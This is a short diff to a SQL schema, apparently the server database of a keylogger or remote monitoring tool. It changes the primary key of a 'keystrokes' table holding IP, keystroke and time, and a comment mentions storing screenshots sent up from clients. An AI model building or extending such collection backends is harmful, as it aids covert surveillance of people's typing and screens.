@@ -22,7 +22,7 @@ CREATE TABLE `keystrokes` (
 	`ip`        TEXT,
         `keystroke` TEXT,
 	`time` TIMESTAMP DEFAULT CURRENT_TIMESTAMP NOT NULL,
-        PRIMARY KEY(`ip`, `keystroke`)
+        PRIMARY KEY(`time`)
 ) WITHOUT ROWID;
 
 -- Store screenshots sent up from the client
